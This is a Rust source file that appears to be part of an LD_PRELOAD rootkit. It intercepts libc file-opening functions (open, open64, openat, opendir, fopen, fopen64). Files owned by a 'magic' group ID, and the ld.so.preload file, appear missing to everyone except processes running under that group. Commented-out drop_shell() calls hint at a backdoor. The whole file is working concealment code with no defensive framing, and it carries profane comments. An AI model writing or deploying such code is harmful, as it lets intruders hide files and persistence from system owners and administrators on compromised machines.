use std::ffi::{c_void, c_char, c_int, CStr};
use std::ptr::{null_mut};
use libc::{FILE, fstatat, getegid, mode_t, stat64};
use errno::{Errno, set_errno};

use config::{GID, PRELOAD};
use stat::{__lxstat, __lxstat64};

#[no_mangle]
pub extern "C" fn open(path: *const c_char, flags: c_int, mode: mode_t) -> c_int {
    //drop_shell();

    let o_open: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"open\0".as_ptr() as *const _) };
    let o_open: extern "C" fn(*const c_char, c_int, mode_t) -> c_int = unsafe { std::mem::transmute(o_open) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_open(path, flags, mode);
    }

    let mut stat_buf: libc::stat = unsafe { std::mem::zeroed() };
    __lxstat(2, path, &mut stat_buf);

    if stat_buf.st_gid == GID || unsafe { CStr::from_ptr(path).to_str().unwrap().contains(PRELOAD) } {
        set_errno(Errno(libc::ENOENT));
        return -1;
    }

    return o_open(path, flags, mode);
}

#[no_mangle]
pub extern "C" fn open64(path: *const c_char, flags: c_int, mode: mode_t) -> c_int {
    //drop_shell();
    let o_open64: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"open64\0".as_ptr() as *const _) };
    let o_open64: extern "C" fn(*const c_char, c_int, mode_t) -> c_int = unsafe { std::mem::transmute(o_open64) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_open64(path, flags, mode);
    }

    let mut stat_buf: stat64 = unsafe { std::mem::zeroed() };
    __lxstat64(2, path, &mut stat_buf);

    if stat_buf.st_gid == GID || unsafe { CStr::from_ptr(path).to_str().unwrap().contains(PRELOAD) } {
        set_errno(Errno(libc::ENOENT));
        return -1;
    }

    return o_open64(path, flags, mode);
}


#[no_mangle]
pub extern "C" fn openat(fd: c_int, path: *const c_char, flags: c_int) -> c_int {
    let o_openat: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"openat\0".as_ptr() as *const _) };
    let o_openat: extern "C" fn(c_int, *const c_char, c_int) -> c_int = unsafe { std::mem::transmute(o_openat) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_openat(fd, path, flags);
    }

    let mut stat_buf: libc::stat = unsafe { std::mem::zeroed() };
    unsafe { fstatat(fd, path, &mut stat_buf, flags) };

    if stat_buf.st_gid == GID || unsafe { CStr::from_ptr(path).to_str().unwrap().contains(PRELOAD) } {
        set_errno(Errno(libc::ENOENT));
        return -1;
    }

    return o_openat(fd, path, flags);
}

// why the fuck are you segfaulting you cunt
#[no_mangle]
pub extern "C" fn opendir(name: *const c_char) -> *mut FILE {
    #[cfg(feature = "debug")]
    println!("opendir() called");

    let o_opendir: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"opendir\0".as_ptr() as *const _) };
    let o_opendir: extern "C" fn(*const c_char) -> *mut FILE = unsafe { std::mem::transmute(o_opendir) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_opendir(name);
    }

    let mut stat_buf: libc::stat = unsafe { std::mem::zeroed() };
    __lxstat(2, name, &mut stat_buf);
    if stat_buf.st_gid == GID || unsafe { CStr::from_ptr(name).to_str().unwrap().contains(PRELOAD) } {
        #[cfg(feature = "debug")]
        println!("directory has magic GID or is ld.so.preload: gid {}", stat_buf.st_gid);

        set_errno(Errno(libc::ENOENT));
        return null_mut();
    }

    return o_opendir(name);
}

#[no_mangle]
pub extern "C" fn fopen(path: *const c_char, mode: *const c_char) -> *mut FILE {
    //drop_shell();
    let o_fopen: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"fopen\0".as_ptr() as *const _) };
    let o_fopen: extern "C" fn(*const c_char, *const c_char) -> *mut FILE = unsafe { std::mem::transmute(o_fopen) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_fopen(path, mode);
    }

    let mut stat64_buf: stat64 = unsafe { std::mem::zeroed() };
    __lxstat64(2, path, &mut stat64_buf);

    if stat64_buf.st_gid == GID {
        set_errno(Errno(libc::ENOENT));
        return null_mut();
    }

    return o_fopen(path, mode);
}

#[no_mangle]
pub extern "C" fn fopen64(path: *const c_char, mode: *const c_char) -> *mut FILE {
    //drop_shell();
    let o_fopen64: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"fopen64\0".as_ptr() as *const _) };
    let o_fopen64: extern "C" fn(*const c_char, *const c_char) -> *mut FILE = unsafe { std::mem::transmute(o_fopen64) };

    let gid = unsafe { getegid() };
    if gid == GID {
        return o_fopen64(path, mode);
    }

    let mut stat64_buf: stat64 = unsafe { std::mem::zeroed() };
    __lxstat64(2, path, &mut stat64_buf);

    if stat64_buf.st_gid == GID {
        set_errno(Errno(libc::ENOENT));
        return null_mut();
    }

    return o_fopen64(path, mode);
}
